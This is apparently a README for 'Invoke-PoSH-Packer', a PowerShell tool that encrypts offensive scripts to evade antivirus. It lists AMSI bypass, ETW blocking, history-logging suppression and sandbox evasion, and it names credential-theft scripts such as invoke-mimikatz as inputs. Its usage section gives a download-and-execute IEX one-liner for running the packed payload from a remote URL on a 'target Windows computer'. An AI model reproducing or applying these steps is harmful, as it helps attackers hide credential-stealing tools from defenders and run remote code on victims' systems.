### Invoke-PoSH-Packer.ps1
--------------------------------------
'Invoke-PoSH-Packer' allows to pack and encrypt offensive PowerShell scripts in order to bypass AV solutions such as Windows Defender.

> Features
  - AES encryption and GZip/Deflate compression (based on 'Xencrypt')
  - AMSI bypass
  - Blocking Event Tracing for Windows (ETW)
  - Disabling PowerShell history logging
  - Basic sandbox evasion techniques (optional)
    - stop/exit if the PowerShell session is being debugged (detection based on "Test-Path Variable:PSDebugContext")
    - wait for 60 seconds before execution
  
> Usage
  - Step 1. Generate a packed & encrypted version of a PowerShell script (e.g. invoke-mimikatz.ps1, invoke-rubeus.ps1) stored locally or on a remote web server
```
PS C:\> Import-Module ./Invoke-PoSH-Packer.ps1
PS C:\> Invoke-PoSH-Packer -FilePath C:\path\script-to-pack.ps1 -OutFile C:\path\Packed-script.ps1 
--- or ---
PS C:\> Invoke-PoSH-Packer -FilePath C:\path\script-to-pack.ps1 -OutFile C:\path\Packed-script.ps1 -sandbox
``` 
```
PS C:\> Import-Module ./Invoke-PoSH-Packer.ps1
PS C:\> Invoke-PoSH-Packer -FileUrl https://URL/script-to-pack.ps1 -OutFile C:\path\Packed-script.ps1  
--- or ---
PS C:\> Invoke-PoSH-Packer -FileUrl https://URL/script-to-pack.ps1 -OutFile C:\path\Packed-script.ps1 -sandbox
```
  - Step 2. Download & execute the packed & encrypted PowerShell script on a target Windows computer
```
PS C:\> IEX (New-Object Net.WebClient).DownloadString('https://URL/Packed-script.ps1'); Invoke-method-of-your-original-script
--- or ---
PS C:\> WGET -URI https://URL/Packed-script.ps1 -OutFile C:\temp\Packed-script.ps1
PS C:\> Import-Module C:\temp\Packed-script.ps1
PS C:\> Invoke-method-of-your-original-script
``` 

> License
  - GNU General Public License v3.0
